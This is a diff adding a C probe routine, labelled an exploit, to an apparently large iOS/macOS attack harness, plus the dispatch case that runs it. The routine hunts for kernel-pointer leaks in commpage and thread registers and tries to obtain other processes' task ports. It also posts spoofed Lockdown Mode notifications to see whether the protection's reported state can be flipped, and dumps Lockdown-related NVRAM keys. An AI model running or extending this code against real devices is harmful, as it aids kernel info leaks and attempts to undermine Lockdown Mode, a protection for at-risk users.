@@ -4298,6 +4298,238 @@ static void r297_probe(void) {
  *   3. Try sel 0,1,16 with crafted input payloads
  *   4. Try trustd/securityd XPC to query entitlements and keybag state
  */
+static void r306_probe(void) {
+    rlog("\n=== r306: Commpage + Exception Handler + LDM Notify Exploit ===\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    /* ---- Part 1: Commpage access ---- */
+    rlog("--- Part 1: ARM64 commpage scan ---\n");
+    {
+        /* ARM64 commpage is typically at 0x0000000FFFFFC000 */
+        uint64_t commpage_addrs[] = {
+            0xFFFFFFC000ULL,     /* 64-bit commpage */
+            0xFFFF4000ULL,       /* 32-bit commpage */
+            0x1FC000000ULL,      /* alternate */
+        };
+        for (int i = 0; i < 3; i++) {
+            /* Use vm_read to safely read without crashing */
+            vm_offset_t data = 0;
+            mach_msg_type_number_t dataCnt = 0;
+            kr = vm_read(mach_task_self(), (vm_address_t)commpage_addrs[i],
+                        4096, &data, &dataCnt);
+            rlog("  commpage 0x%llx: vm_read kr=0x%x dataCnt=%u\n",
+                 commpage_addrs[i], kr, dataCnt);
+            if (kr == KERN_SUCCESS && dataCnt > 0) {
+                uint8_t *p = (uint8_t*)(uintptr_t)data;
+                rlog("    magic: %02x%02x%02x%02x%02x%02x%02x%02x\n",
+                     p[0], p[1], p[2], p[3], p[4], p[5], p[6], p[7]);
+                /* Scan for kernel pointers */
+                for (uint32_t off = 0; off + 8 <= dataCnt; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, p + off, 8);
+                    if ((v >> 36) == 0xfffffff) {
+                        rlog("    ** KPTR at +0x%x: 0x%llx **\n", off, v);
+                    }
+                }
+                /* Dump signature region */
+                rlog("    bytes[0..63]: ");
+                for (int j = 0; j < 64 && j < (int)dataCnt; j++)
+                    rlog("%02x", p[j]);
+                rlog("\n");
+                vm_deallocate(mach_task_self(), data, dataCnt);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: processor_set_tasks ---- */
+    rlog("\n--- Part 2: processor_set_tasks ---\n");
+    {
+        mach_port_t pset = MACH_PORT_NULL, pset_priv = MACH_PORT_NULL;
+        kr = processor_set_default(mach_host_self(), &pset);
+        rlog("  default pset: 0x%x kr=0x%x\n", pset, kr);
+
+        typedef kern_return_t (*pst_fn)(processor_set_t, task_array_t*, mach_msg_type_number_t*);
+        pst_fn pst = (pst_fn)dlsym(RTLD_DEFAULT, "processor_set_tasks");
+        rlog("  processor_set_tasks: %p\n", (void*)pst);
+
+        if (pst && pset) {
+            task_array_t tasks = NULL;
+            mach_msg_type_number_t taskCnt = 0;
+            kr = pst(pset, &tasks, &taskCnt);
+            rlog("  processor_set_tasks: kr=0x%x count=%u\n", kr, taskCnt);
+            if (kr == KERN_SUCCESS && taskCnt > 0) {
+                rlog("  TASKS ACCESSIBLE! First 10:\n");
+                for (uint32_t i = 0; i < taskCnt && i < 10; i++) {
+                    rlog("    task[%u]: 0x%x\n", i, tasks[i]);
+                }
+                vm_deallocate(mach_task_self(), (vm_address_t)tasks,
+                    taskCnt * sizeof(task_t));
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: Mach exception handler for kernel info leak ---- */
+    rlog("\n--- Part 3: Exception handler setup ---\n");
+    {
+        mach_port_t exc_port = MACH_PORT_NULL;
+        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc_port);
+        rlog("  exception port: 0x%x kr=0x%x\n", exc_port, kr);
+        kr = mach_port_insert_right(mach_task_self(), exc_port, exc_port,
+            MACH_MSG_TYPE_MAKE_SEND);
+        rlog("  insert right: kr=0x%x\n", kr);
+
+        /* Get current exception ports (might reveal kernel state) */
+        exception_mask_t masks[32];
+        mach_msg_type_number_t masksCnt = 32;
+        exception_handler_t handlers[32];
+        exception_behavior_t behaviors[32];
+        thread_state_flavor_t flavors[32];
+
+        kr = task_get_exception_ports(mach_task_self(),
+            EXC_MASK_ALL, masks, &masksCnt,
+            handlers, behaviors, flavors);
+        rlog("  task_get_exception_ports: kr=0x%x count=%u\n", kr, masksCnt);
+        for (uint32_t i = 0; i < masksCnt; i++) {
+            rlog("    [%u] mask=0x%x handler=0x%x behavior=%d flavor=%d\n",
+                 i, masks[i], handlers[i], behaviors[i], flavors[i]);
+            /* Handler ports might reveal kernel objects */
+            if (handlers[i] != MACH_PORT_NULL && handlers[i] != MACH_PORT_DEAD) {
+                rlog("      ** ACTIVE HANDLER: 0x%x **\n", handlers[i]);
+            }
+        }
+
+        mach_port_deallocate(mach_task_self(), exc_port);
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: LDM Notification state manipulation ---- */
+    rlog("\n--- Part 4: LDM notification deep manipulation ---\n");
+    {
+        /* Set LDM state to enabled via notifications */
+        int token1 = 0, token2 = 0;
+        notify_register_check("com.apple.LockdownMode.stateDidChange", &token1);
+        notify_register_check("com.apple.LockdownMode.stateWillChange", &token2);
+
+        /* Check baseline MCProfileConnection LDM status */
+        Class mcpc = objc_getClass("MCProfileConnection");
+        if (mcpc) {
+            id conn = ((id(*)(id,SEL))objc_msgSend)((id)mcpc,
+                sel_registerName("sharedConnection"));
+            if (conn) {
+                BOOL ldm = ((BOOL(*)(id,SEL))objc_msgSend)(conn,
+                    sel_registerName("isLockdownModeEnabled"));
+                rlog("  MCProfileConnection.isLockdownModeEnabled BEFORE: %d\n", ldm);
+            }
+        }
+
+        /* Set notification state to 1 (enabled) and post */
+        notify_set_state(token1, 1);
+        notify_post("com.apple.LockdownMode.stateWillChange");
+        notify_post("com.apple.LockdownMode.stateDidChange");
+
+        /* Tiny delay for daemons to process */
+        usleep(100000); /* 100ms */
+
+        /* Check if MCProfileConnection picked up the change */
+        if (mcpc) {
+            id conn = ((id(*)(id,SEL))objc_msgSend)((id)mcpc,
+                sel_registerName("sharedConnection"));
+            if (conn) {
+                BOOL ldm = ((BOOL(*)(id,SEL))objc_msgSend)(conn,
+                    sel_registerName("isLockdownModeEnabled"));
+                rlog("  MCProfileConnection.isLockdownModeEnabled AFTER: %d\n", ldm);
+            }
+        }
+
+        /* Check NVRAM to see if anything changed */
+        io_registry_entry_t nvram = IORegistryEntryFromPath(
+            kIOMasterPortDefault, "IODeviceTree:/options");
+        if (nvram) {
+            CFMutableDictionaryRef nvProps = NULL;
+            IORegistryEntryCreateCFProperties(nvram, &nvProps, kCFAllocatorDefault, 0);
+            if (nvProps) {
+                /* Look for LDM-related keys */
+                CFStringRef ldmKey = CFSTR("40A0DDD2-77F8-4392-B4A3-1E7304206516:ldm");
+                CFTypeRef ldmVal = CFDictionaryGetValue(nvProps, ldmKey);
+                rlog("  NVRAM LDM key: %p\n", (void*)ldmVal);
+                if (ldmVal) {
+                    rlog("    ** LDM NVRAM KEY EXISTS! **\n");
+                    if (CFGetTypeID(ldmVal) == CFDataGetTypeID()) {
+                        CFDataRef d = (CFDataRef)ldmVal;
+                        const uint8_t *b = CFDataGetBytePtr(d);
+                        rlog("    value: ");
+                        for (int i = 0; i < CFDataGetLength(d) && i < 16; i++)
+                            rlog("%02x", b[i]);
+                        rlog("\n");
+                    }
+                }
+
+                /* Also check for obliteration key */
+                CFStringRef oblKey = CFSTR("40A0DDD2-77F8-4392-B4A3-1E7304206516:obliteration");
+                CFTypeRef oblVal = CFDictionaryGetValue(nvProps, oblKey);
+                rlog("  NVRAM obliteration key: %p\n", (void*)oblVal);
+
+                /* Dump ALL NVRAM keys to find anything LDM-related */
+                CFIndex count = CFDictionaryGetCount(nvProps);
+                const void **keys = malloc(sizeof(void*) * count);
+                CFDictionaryGetKeysAndValues(nvProps, keys, NULL);
+                rlog("  NVRAM keys (%lld total):\n", (long long)count);
+                for (CFIndex i = 0; i < count; i++) {
+                    char kstr[256] = {0};
+                    CFStringGetCString(keys[i], kstr, sizeof(kstr), kCFStringEncodingUTF8);
+                    if (strstr(kstr, "ldm") || strstr(kstr, "LDM") ||
+                        strstr(kstr, "lockdown") || strstr(kstr, "Lockdown") ||
+                        strstr(kstr, "40A0DDD2")) {
+                        rlog("    ** %s **\n", kstr);
+                    }
+                }
+                free(keys);
+                CFRelease(nvProps);
+            }
+            IOObjectRelease(nvram);
+        }
+
+        /* Reset state */
+        notify_set_state(token1, 0);
+        notify_post("com.apple.LockdownMode.stateDidChange");
+        notify_cancel(token1);
+        notify_cancel(token2);
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: Thread state inspection ---- */
+    rlog("\n--- Part 5: Thread state / TPIDR_EL0 ---\n");
+    {
+        uint64_t tpidr;
+        __asm__ volatile("mrs %0, TPIDR_EL0" : "=r"(tpidr));
+        rlog("  TPIDR_EL0: 0x%llx\n", tpidr);
+        if ((tpidr >> 36) == 0xfffffff) {
+            rlog("    ** KERNEL POINTER IN TPIDR! **\n");
+        }
+
+        /* Read thread state */
+        thread_port_t thread = mach_thread_self();
+        arm_thread_state64_t state;
+        mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+        kr = thread_get_state(thread, ARM_THREAD_STATE64,
+            (thread_state_t)&state, &count);
+        rlog("  thread_get_state: kr=0x%x count=%u\n", kr, count);
+        if (kr == KERN_SUCCESS) {
+            rlog("  pc=0x%llx lr=0x%llx sp=0x%llx fp=0x%llx\n",
+                 (uint64_t)state.__pc, (uint64_t)state.__lr,
+                 (uint64_t)state.__sp, (uint64_t)state.__fp);
+        }
+        mach_port_deallocate(mach_task_self(), thread);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r306 complete ===\n");
+    fflush(stdout);
+}
+
 static void r305_probe(void) {
     rlog("\n=== r305: IORegistry Ptr Scan + Zone Info + LDM Notify + VM Region ===\n\n");
     fflush(stdout);
@@ -31706,6 +31938,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 306) {
+            rlog("*** rounds=306: Commpage + Exception Handler + LDM Notify Exploit ***\n");
+            rlog("  r305: notify_post works! Registry clean, zone info dead.\n");
+            rlog("  Probe: commpage access, processor_set_tasks, exc ports, LDM deep.\n\n");
+            r306_probe();
             goto done;
         }
         if (rounds == 305) {
